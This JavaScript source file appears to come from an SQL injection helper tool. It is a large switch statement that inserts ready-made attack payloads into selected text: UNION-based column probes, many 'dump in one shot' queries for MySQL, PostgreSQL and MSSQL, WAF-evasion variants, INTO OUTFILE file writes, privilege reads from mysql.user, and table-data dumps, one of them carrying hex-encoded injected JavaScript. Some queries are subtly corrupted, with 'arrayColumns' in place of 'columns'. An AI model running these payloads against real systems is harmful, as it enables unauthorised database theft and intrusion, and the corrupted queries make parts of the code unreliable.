function setUnionBased(id){
	var rep, dbNameFinal, tblNameFinal,	Db, table, cols, data = "";

	switch (id) {
		/*------COLUMN COUNT: ORDER BY------*/
		case "orderby":
			setSelectedText('ORDER BY 1');
			break;

		/*------COLUMN COUNT: +ORDER+BY+------*/
		case "orderby2":
			setSelectedText('+ORDER+BY+1');
			break;

		/*------COLUMN COUNT: GROUP BY------*/
		case "groupby":
			setSelectedText('GROUP BY ' + iGroupBy());
			break;

		/*------COLUMN COUNT: +GROUP+BY+------*/
		case "groupby2":
			setSelectedText('+GROUP+BY+' + iGroupBy());
			break;

		/*------COLUMN COUNT: PROCEDURE ANALYSE()------*/
		case "procedure":
			setSelectedText('+PROCEDURE+ANALYSE()');
			break;

		/*------COLUMN COUNT: SELECT * FROM------*/
		case "selectall":
			getSelectedText(function(str) {
				setSelectedText("'+AND+(SELECT * FROM " + str + ')=(SELECT 1)--+');
			});
			break;

		/*------UNION STATEMENT: +UNION+SELECT+INT,INT------*/
		case "unintplus1":
			iPrompt(function(str) {
				//console.log(str)
				columns = Math.min(1000, parseInt(str));
				var colArray = new Array();
				for (var i = 0; i < columns; i++) {
					colArray.push(i + 1);
				}
				setSelectedText("+UNION+SELECT+" + arrayColumns(str).join(','));
			});
			break;

		/*------UNION STATEMENT: +UNION+ALL+SELECT+INT,INT------*/
		case "unintplus2":
			iPrompt(function(str) {
				setSelectedText("+UNION+ALL+SELECT+" + arrayColumns(str).join(','));
			});
			break;

		/*------UNION STATEMENT: +UNION(SELECT(INT),(INT))------*/
		case "unintplus3":
			iPrompt(function(str) {
				setSelectedText("+UNION(SELECT(" + arrayColumns(str).join('),(') + ")" + ")");
			});
			break;

		/*------UNION STATEMENT: +UNION+SELECT+null,null------*/
		case "unullplus1":
			iPrompt(function(str) {
				rep = iNull(str);
				setSelectedText("+UNION+SELECT+" + rep.substr(0, rep.length - 1) + "");
			});
			break;

		/*------UNION STATEMENT: +UNION+ALL+SELECT+null,null------*/
		case "unullplus2":
			iPrompt(function(str) {
				rep = iNull(str);
				setSelectedText("+UNION+ALL+SELECT+" + rep.substr(0, rep.length - 1) + "");
			});
			break;

		/*------LOCAL DIOS: LOCAL DIOS 1------*/
		case "localdios1":
			iPrompt(function(str) {
				setSelectedText(" div @s:=( concat(@c:=0x00,if((select count(*)/*!50000from*/ /*!50000information_schema*/.arrayColumns where table_schema=database/**X**/() and @c:=concat(@c, 0x3c62723e, /*!50000table_name*/,0x2e,/*!50000column_name*/)),0x00,0x00),@c)) /*!50000union*/ select " + arrayColumns(str).join(','));
			});
			break;

		/*------LOCAL DIOS: LOCAL DIOS 2------*/
		case "localdios2":
			iPrompt(function(str) {
				setSelectedText(" +DiV@x:=(Select+export_set(5,@:=0,(select+count(*)from(/*!50000information_schema*/.columns)where@:=export_set(5,export_set(5,@,/*!50000table_name*/,0x3c6c693e,2),/*!50000column_name*/,0xa3a,2)),@,2)) /*!50000union*/+ALL+SELECT+" + arrayColumns(str).join(','));
			});
			break;

		/*------LOCAL DIOS: LOCAL DIOS 3------*/
		case "localdios3":
			iPrompt(function(str) {
				setSelectedText(" and@:=(seleCt GrOup_ConcAt(0x3c62723e,Table_name,column_name) frOm /*!50000information_schema.arrayColumns*/ where table_schema not like 0x696e666f726d6174696f6e5f736368656d61) /*!50000Union*/ Select " + arrayColumns(str).join(','));
			});
			break;

		/*------LOCAL DIOS: LOCAL DIOS 4------*/
		case "localdios4":
			iPrompt(function(str) {
				setSelectedText(" and@x:=(/*!50000SELECT */GROUP_CONCAT(/*!50000table_name*/,0x2d2d2d3e,/*!50000column_Name*/ SEPARATOR 0x3c62723e)/*!50000FROM *//*!50000INFORMATION_SCHEMA*/.arrayColumns WHERE TABLE_SCHEMA=DATABASE/**!**/())  /*!50000union*/ ALL /*!50000select*/" + arrayColumns(str).join(','));
			});
			break;

		/*------LOCAL DIOS: LOCAL DIOS 5------*/
		case "localdios5":
			iPrompt(function(str) {
				setSelectedText(" div @x:=(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(/*!50000INFORMATION_SCHEMA*/.COLUMNS)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT/**_**/(@x,0x3a20,0x3c666f6e7420636f6c6f723d677265656e3e,/*!50000table_name*/,0x202d2d20,0x3c666f6e7420636f6c6f723d7265643e,/*!50000column_name*/,0x3c62723e))))x) /*!50000Union*/ Select " + arrayColumns(str).join(','));
			});
			break;

		/*------LOCAL DIOS: LOCAL DIOS 6------*/
		case "localdios6":
			iPrompt(function(str) {
				setSelectedText("and@x:=(Select+/*!50000export_set*/(5,@:=0,(select+count(*)from(/*!50000information_schema.arrayColumns*/)where@:=export_set(5,/*!50000export_set*/(5,@,/*!50000table_name*/,0x3c6c693e,2),/*!50000column_name*/,0xa3a,2)),@,2))/*!50000UNION*/ ALL SELECT " + arrayColumns(str).join(','));
			});
			break;

		/*------LOCAL DIOS: LOCAL DIOS 7------*/
		case "localdios7":
			iPrompt(function(str) {
				setSelectedText(" and @s:=(select(@s)from(select(@s:=0x00),(@nr:=0),(select (0)from/*!50000information_schema*/.arrayColumns where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@s:=concat(@s,0x3c666f6e7420636f6c6f723d7265643e,lpad(@nr:=@nr%2b1,3,0x30),0x3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20,/*!50000table_name*/,0x3c2f666f6e743e3c666f6e7420636f6c6f723d677265656e3e20,/*!50000column_name*/,0x3c2f666f6e743e3c62723e))))x)/*!50000union*/ select +" + arrayColumns(str).join(','));
			});
			break;

		/*------LOCAL DIOS: LOCAL DIOS 8------*/
		case "localdios8":
			iPrompt(function(str) {
				setSelectedText("and@:=(SeLeCt /*!50000GrOup_ConCat(0x3c6c693e,/*!50000TaBle_naMe,0x207e20,/*!50000ColuMn_naMe*/)FrOm /*!50000inForMatiOn_scHeMa*/.arrayColumns where table_schema=database/**_**/()) /*!50000union*/ select " + arrayColumns(str).join(','));
			});
			break;

		/*------+INTO+OUTFILE+"path/of/file"------*/
		case "intoutfile":
			iPrompt(function(str) {
				setSelectedText("+INTO+OUTFILE+\"" + str + "\"");
			});
			break;

		/*------PRIVILEGES CHECK VIA IS.PRIVILEGES------*/
		case "privi1":
			setSelectedText("(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)");
			break;

		/*------PRIVILEGES CHECK VIA MYSQL SYSTEM TABLE------*/
		case "privi2":
			setSelectedText("(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)");
			break;

		/*------GET RUNNING QUERY------*/
		case "runquery":
			setSelectedText("(SELECT+CONCAT(info)+FROM+INFORMATION_SCHEMA.PROCESSLIST)");
			break;

		/*------DB_NAMES GROUP_CONCAT()------*/
		case "db1":
			setSelectedText("(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)");
			break;

		/*------DB_NAMES ONE SHOT------*/
		case "db2":
			setSelectedText("(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)");
			break;

		/*------DB_NAMES FRM TABLE NAME------*/
		case "db3":
			setSelectedText("(select group_Concat(0x3c62723e,table_schema) from {f information_schema.tables} where table_name = 'admin')");
			break;

		/*------DB_NAMES FRM TABLE NAME WAF------*/
		case "db4":
			setSelectedText("(select /*!50000group_Concat(*/table_schema) from {f information_schema.tables} where table_name = 'admin')");
			break;

		/*------TABLE_NAMES GROUP CONCAT()------*/
		case "tbl1":
			//DATABASE NAME
			iPrompt(function(str) {
				for (var i = 0; i < str.length; i++) {
					dbNameFinal += str.charCodeAt(i).toString(16);
				}
				setSelectedText("(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=" + dbNameFinal + ")");
			});
			break;

		/*------TABLE_NAMES ONE SHOT------*/
		case "tbl2":
			setSelectedText("(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)");
			break;

		/*------TABLE_NAME COUNT------*/
		case "tbl3":
			setSelectedText("concat(0x636f756e743a20, (Select count(0) from admin))");
			break;

		/*------NAME GROUP CONCAT------*/
		case "clmn1":
			//TABLE NAME
			iPrompt(function(str) {
				for (var i = 0; i < str.length; i++) {
					tblNameFinal += str.charCodeAt(i).toString(16);
				}
				setSelectedText("(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=" + tblNameFinal + ")");
			});
			break;

		/*------COLUMN NAME ONE SHOT------*/
		case "clmn2":
			setSelectedText("concat(0x636f756e743a20, (Select count(0) from admin))");
			break;

		/*------DATA GROUP CONCAT------*/
		case "data1":
			iPrompt(function(database) {
				Db = database;
				table = prompt("Insert table name", "TABLE_NAME to dump");
				cols = prompt("Insert columns to dump", "column_1,0x3a,column_2,0x3a,column_3");
				setSelectedText("(SELECT+GROUP_CONCAT(" + cols + "+SEPARATOR+0x3c62723e)+FROM+" + Db + "." + table + ")");
			});
			break;

		/*------DATA ONE SHOT------*/
		case "data2":
			iPrompt(function(database) {
				Db = database;
				table = prompt("Insert table name", "TABLE_NAME to dump");
				cols = prompt("Insert columns to dump", "column_1,0x3a,column_2,0x3a,column_3");
				setSelectedText("(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" + Db + "." + table + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + cols + ",0x3c62723e))))x)");
			});
			break;

		/*------DATA SECOND SHOT------*/
		case "data3":
			iPrompt(function(database) {
				Db = database;
				table = prompt("Insert table name", "TABLE_NAME to dump");
				cols = prompt("Insert columns to dump", "column_1,0x3a,column_2,0x3a,column_3");
				setSelectedText("(SELECT+GROUP_CONCAT(0x3c62723e," + cols + ")+FROM (" + Db + "." + table + "))");
			});
			break;

		/*------DATA THIRD SHOT------*/
		case "data4":
			iPrompt(function(database) {
				Db = database;
				table = prompt("Insert table name", "TABLE_NAME to dump");
				cols = prompt("Insert columns to dump", "column_1,0x3a,column_2,0x3a,column_3");
				setSelectedText("concat(0x416c69656e205368616e75203a3a20,version(),0x3a3a3a,user(),0x3a3a3a,database(),(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" + Db + "." + table + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + cols + ",0x3c62723e))))x))");
			});
			break;

		/*------DIOS BY T-PRO------*/
		case "diostpro":
			//DATABASE NAME
			iPrompt(function(str) {
				for (var i = 0; i < str.length; i++) {
					tblNameFinal += str.charCodeAt(i).toString(16);
				}
				setSelectedText("(select (@x)from(select(@x:=0x00),(@NR_TAB:=0),(select (0)from(information_schema.tables)where(table_schema=" + dbNameFinal + ")and(0x00)in(@x:=concat(@x,0x3c62723e,0x3c62723e,0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e,@tbl:=table_name,0x202d2d3e205441424c45204e7220,(@NR_TAB:=@NR_TAB%2b1),0x3c2f7370616e3e,0x3c62723e,0x3c62723e,(@NR_COL:=char(0)),0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e434f4c554d53204f46205441424c453c2f7370616e3e3c62723e,(select group_concat((@NR_COL:=@NR_COL%2b1),0x20203a2020,column_name+separator+0x3c62723e)from+information_schema.columns+where+table_schema=Database()+and+table_name=@tbl)))))x)");
			});
			break;

		/*------DIOS BY DR.Z3R0------*/
		case "diosz3r0":
			setSelectedText("(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))")
			break;

		/*------DIOS SET BY TR0JAN (WAF)------*/
		case "diostr01":
			setSelectedText("concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/")
			break;

		/*------DIOS SET BY TR0JAN (BENCHMARK)------*/
		case "diostr02":
			setSelectedText("concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)");
			break;

		/*------DIOS SET BY MAKMAN (NORMAL)------*/
		case "diosmak1":
			setSelectedText("concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e6420777269746520276d616b6d616e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c6d616b6d616e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f726420276d616b6d616e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e30204279204d616b4d616e3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0x3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c30783363363233653363363636663665373432303633366636633666373233643732363536343365323035333531346336393437346634343733323035333739366537343631373832303536323033313265333032303432373932303464363136623464363136653363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652c307833633733363337323639373037343365373137353635373237393364323232323362363636663732323836393364333133623639336336333666366336333665373433623639326232623239376237313735363537323739336437313735363537323739326236333666366336653631366436353562363935643262323232633330373833323330333336313333363133323330326332323362376437353732366333643735373236633265373236353730366336313633363532383232323732323263323232353332333732323239336236343664373037313735363537323739336437353732366332653732363537303663363136333635323832323664363136623664363136653232326332323238373336353663363536333734323834303239323036363732366636643238373336353663363536333734323834303361336433303738333033303239323032633238373336353663363536333734323032383430323932303636373236663664323832323262363436323262323232653232326237343632366332623232323937373638363537323635323834303239323036393665323032383430336133643633366636653633363137343566373737333238333037383332333032633430326332323262373137353635373237393262323233303738333336333336333233373332333336353239323932393239363132393232323933623634366636333735366436353665373432653737373236393734363532383232336336313230363837323635363633643237323232623634366437303731373536353732373932623232323733653433366336393633366232303438363537323635323037343666323034343735366437303230373436383639373332303737363836663663363532303534363136323663363533633631336532323239336233633266373336333732363937303734336529292929223b75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c61636528226d616b6d616e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)");
			break;

		/*------DIOS SET BY MAKMAN (WAF)------*/
		case "diosmakwaf":
			iPrompt(function(str) {
				for (var i = 0; i < str.length; i++) {
					tblNameFinal += str.charCodeAt(i).toString(16);
				}
				setSelectedText("(select(@x)from(select(@x:=0x00),(@nr:=0),(@tbl:=0x0),(select(0)from(information_schema.tables)where(table_schema=" + dbNameFinal + ")and(0x00)in(@x:=concat_ws(0x20,@x,lpad(@nr:=@nr%2b1,3,0x0b),0x2e20,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,(select+count(*)+from+information_schema.arrayColumns+where+table_name=@tbl),0x3c2f666f6e743e5d20207d3c2f666f6e743e,0x3c62723e))))x)");
			});
			break;

		/*------DIOS SET BY MADBLOOD (NORMAL)------*/
		case "diosmad1":
			setSelectedText("(Select+export_set(5,@:=0,(select+count(*)from(information_schema.arrayColumns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))");
			break;

		/*------DIOS SET BY MADBLOOD (WAF)------*/
		case "diosmadwaf":
			setSelectedText("export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.arrayColumns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)");
			break;

		/*------DIOS SET BY MADBLOOD (X@)------*/
		case "diosmad@X":
			setSelectedText("+and@x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.arrayColumns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT+");
			break;

		/*------DIOS SET BY ZEN (NORMAL 1)------*/
		case "dioszen1":
			setSelectedText("make_set(6,@:=0x0a,(select(1)from(information_schema.arrayColumns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)");
			break;

		/*------DIOS SET BY ZEN (NORMAL 2)------*/
		case "dioszen2":
			setSelectedText("/*!50000make_set(6,@:=0x0a,(select(1)from(information_schema.arrayColumns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)*/");
			break;

		/*------DIOS SET BY ZEN (WAF)------*/
		case "dioszenwaf":
			setSelectedText("(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`arrayColumns`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)");
			break;

		/*------DIOS SET BY AKJARO------*/
		case "diosakjaro":
			setSelectedText("(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.arrayColumns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)");
			break;

		/*------DIOS POSTGRESQL 8.4------*/
		case "PostgreSQL1":
			setSelectedText("(select+array_to_string(array_agg(concat(table_name,'::',column_name)::text),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))");
			break;

		/*------DIOS POSTGRESQL 9.1------*/
		case "PostgreSQL2":
			setSelectedText("(select+string_agg(concat(table_name,'::',column_name),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))");
			break;

		/*------DIOS POSTGRESQL ALL VERSION------*/
		case "PostgreSQL3":
			setSelectedText("(select+array_to_string(array(select+table_name||':::'||column_name::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E'))");
			break;

		/*------DIOS MSSQL BY RUMMY / ZEN------*/
		case "mssql":
			setSelectedText(";begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by rummykhan :: '%2b@@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @a=@a %2b column_name%2b' : ' from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%2b@z%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns : '%2b@a%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into Chall1 END--");
			break;
	}
}